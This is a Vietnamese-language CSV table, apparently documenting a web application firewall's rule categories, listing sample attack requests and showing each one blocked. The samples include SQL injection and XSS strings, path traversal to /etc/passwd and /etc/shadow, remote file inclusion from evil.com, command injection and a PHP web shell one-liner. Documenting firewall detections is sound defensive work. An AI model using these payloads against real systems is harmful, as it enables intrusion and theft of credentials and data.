Loại tấn công,Tên tiếng Việt,Request mẫu,Rule phát hiện,Điểm số,Kết quả,Giải thích
Normal Request,Request bình thường,GET /products?id=123,Không có,0,✅ Cho qua,Request hợp lệ không có dấu hiệu tấn công
SQL Injection,Tiêm SQL,GET /products?id=1' OR '1'='1,942xxx,5,❌ Bị chặn,Cố gắng bypass xác thực qua SQL
SQL Injection,Tiêm SQL,GET /user?name=admin'--,942xxx,5,❌ Bị chặn,Comment out phần còn lại của SQL query
SQL Injection,Tiêm SQL,POST /search data=1 UNION SELECT password FROM users,942xxx,5,❌ Bị chặn,Cố gắng lấy dữ liệu từ bảng khác
XSS,Cross-Site Scripting,POST /comment message=<script>alert('XSS')</script>,941xxx,5,❌ Bị chặn,Cố gắng chạy JavaScript độc hại
XSS,Cross-Site Scripting,GET /search?q=<img src=x onerror=alert(1)>,941xxx,5,❌ Bị chặn,XSS qua event handler
LFI,Đọc file cục bộ,GET /file?path=../../../etc/passwd,930xxx,5,❌ Bị chặn,Directory traversal để đọc file hệ thống
LFI,Đọc file cục bộ,GET /download?file=....//....//etc/shadow,930xxx,5,❌ Bị chặn,Bypass filter với double encoding
RFI,Gọi file từ xa,GET /include?page=http://evil.com/shell.php,931xxx,5,❌ Bị chặn,Cố gắng load malicious script từ bên ngoài
RCE,Thực thi lệnh từ xa,GET /ping?host=127.0.0.1;cat /etc/passwd,932xxx,5,❌ Bị chặn,Command injection qua dấu chấm phẩy
RCE,Thực thi lệnh từ xa,POST /exec cmd=`whoami`,932xxx,5,❌ Bị chặn,Command injection qua backticks
PHP Injection,Tiêm mã PHP,POST /upload code=<?php system($_GET['cmd']); ?>,933xxx,5,❌ Bị chặn,Cố gắng upload PHP shell
Scanner,Công cụ quét,Request với User-Agent: sqlmap/1.0,913xxx,3-5,❌ Bị chặn,Phát hiện tool quét lỗ hổng tự động
Protocol Violation,Vi phạm giao thức,Request với Content-Length: abc,920xxx,4,❌ Bị chặn,Content-Length không phải số
